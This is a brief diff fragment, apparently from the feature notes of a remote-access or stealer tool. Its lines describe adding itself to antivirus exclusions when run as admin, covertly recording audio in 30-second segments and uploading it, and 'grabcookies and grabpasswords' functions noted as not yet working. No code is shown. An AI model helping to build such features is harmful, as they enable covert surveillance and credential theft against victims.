@@ -37,4 +37,6 @@ MADE IT TO WHERE IF IT IS RAN AS ADMIN IT IMMEDIATELY ADDS IT SELF TO EXCLUSIONS
         {"name": "Background Audio Recording", "value": "The system automatically records audio in 30-second segments and uploads them to the system's channel"}
 
 
+grabcookies and grabpasswords doesnt work rn
+
 # MORE COMING SOON
